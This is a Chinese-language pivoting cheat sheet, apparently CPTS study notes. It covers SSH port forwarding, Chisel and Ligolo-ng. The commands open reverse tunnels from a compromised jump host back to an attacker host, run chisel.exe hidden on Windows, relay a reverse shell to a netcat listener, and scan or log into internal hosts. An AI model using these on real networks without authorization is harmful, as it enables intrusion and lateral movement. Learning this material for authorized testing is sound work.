# Pivot 工具決策速查

## 標籤

- #cpts
- #pivoting
- #cheatsheet
- #quick-reference

---

## 第一步：判斷跳板機環境

```
跳板機有 SSH 服務且你有帳號？
├── 是 → 跳到【SSH 決策】
└── 否（Windows / 沒 SSH）
      只有 HTTP/HTTPS 出站？
      ├── 是 → 【Chisel（穿防火牆模式）】
      └── 否
            需要掃整個網段 / 多工具並行？
            ├── 是 → 【Ligolo-ng】
            └── 否 → 【Chisel（標準模式）】
```

---

## SSH 決策

```
你需要做什麼？
├── 只連 1-2 個固定服務（RDP / WinRM / SMB）→ 【ssh -L】
├── 掃整個網段 / 跑很多工具 → 【ssh -D + proxychains】
└── 只需要 SSH 進更深層的主機 → 【ssh -J】
```

---

## 工具對照表

| 工具 | 前提 | 適合 | 不適合 |
|------|------|------|------|
| **ssh -L** | 有 SSH 帳號 | 快速存取 1-2 個服務 | 多目標 / 整網段 |
| **ssh -D** | 有 SSH 帳號 | 多工具 + proxychains | nmap SYN scan |
| **ssh -J** | 有 SSH 帳號 | 只需要 SSH 多跳 | 其他工具 |
| **Chisel** | 能上傳執行檔 | HTTP 穿防火牆、Windows 跳板機 | nmap SYN scan |
| **Ligolo-ng** | 能上傳執行檔 | nmap SYN、多工具、多網段、長時間作業 | 設定最複雜 |

---

## 結果一：ssh -L（存取固定服務）

```bash
# 把遠端服務帶到 Kali 本機
ssh -L 本地PORT:目標IP:目標PORT user@跳板IP -N -f

# 範例：RDP + WinRM 一次開
ssh user@10.129.10.5 -N -f \
  -L 13389:172.16.139.35:3389 \
  -L 15985:172.16.139.35:5985

# 使用
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Password!'
evil-winrm -i 127.0.0.1 -P 15985 -u Administrator -p 'Password!'
```

---

## 結果二：ssh -D（SOCKS + proxychains）

```bash
# 開 SOCKS5 proxy
ssh -D 1080 user@10.129.10.5 -N -f

# proxychains4.conf 最後一行
socks5 127.0.0.1 1080

# 使用（注意 nmap 只能用 -sT）
proxychains4 nxc smb 172.16.139.0/24
proxychains4 nmap -sT -Pn -p 445,3389,5985 172.16.139.3
```

---

## 結果三：ssh -J（多跳 SSH）

```bash
# 單跳
ssh -J user@跳板IP user@內網IP

# 雙跳
ssh -J user@跳板1,user@跳板2 user@目標IP
```

---

## 結果四：Chisel（標準 / 穿防火牆）

```bash
# Kali（server）
./chisel server -p 9001 --reverse          # 標準
sudo ./chisel server -p 80 --reverse       # 穿防火牆（HTTP 80）

# 跳板機（client）
./chisel client KALI_IP:9001 R:socks       # Linux
.\chisel.exe client KALI_IP:80 R:socks     # Windows，穿防火牆

# Windows 背景執行
Start-Process -WindowStyle Hidden chisel.exe -ArgumentList "client KALI_IP:9001 R:socks"

# proxychains4.conf
socks5 127.0.0.1 1080

# 驗證
ss -tnlp | grep 1080
proxychains4 nxc smb 172.16.139.3
```

---

## 結果五：Ligolo-ng

```bash
# Kali — 初始化（只做一次）
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 跳板機 — 執行 agent
./agent -connect KALI_IP:11601 -ignore-cert                   # Linux
.\agent.exe -connect KALI_IP:11601 -ignore-cert               # Windows

# Proxy 介面操作順序
session → ifconfig（看內網網段）→ start

# Kali — 加路由
sudo ip route add 172.16.139.0/24 dev ligolo

# 驗證（不需要 proxychains）
ping -c1 172.16.139.3
nmap -sS -Pn -p 445,3389,5985 172.16.139.3    # SYN scan 直接跑
nxc smb 172.16.139.0/24

# 接 reverse shell
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
nc -lvnp 4444
```

---

## 雙跳快速對照

| 工具 | 雙跳做法 |
|------|---------|
| SSH | `ssh -J 跳板1,跳板2 目標` |
| Chisel | 跳板1 開 server，跳板2 連進來；Kali 透過隧道轉發 |
| Ligolo-ng | 跳板1 加 listener 轉發 11602；Kali 開第二個 proxy 用 ligolo2 |

---

## 常見問題速查

| 問題 | 原因 | 解法 |
|------|------|------|
| nmap 掃不到 / 結果空 | SOCKS 不支援 SYN scan | 改 `-sT -Pn` |
| proxychains 連不到 | SOCKS port 沒開 | `ss -tnlp \| grep 1080` |
| Kerberos 全部失敗 | WSL2 時鐘偏差 | `TZ=UTC faketime "$DC_TIME" <指令>` |
| Chisel 不定時斷線 | 無 keepalive | 加 `--keepalive 10s` |
| Ligolo ping 不通 | 路由沒加 | `sudo ip route add 網段 dev ligolo` |
| Reverse shell 接不到 | Ligolo 沒加 listener | `listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT --tcp` |

---

## 關聯筆記

- [[65-SSH埠轉發|第 65 章 - SSH 埠轉發]]
- [[66-Chisel|第 66 章 - Chisel]]
- [[67-Ligolo-ng|第 67 章 - Ligolo-ng]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
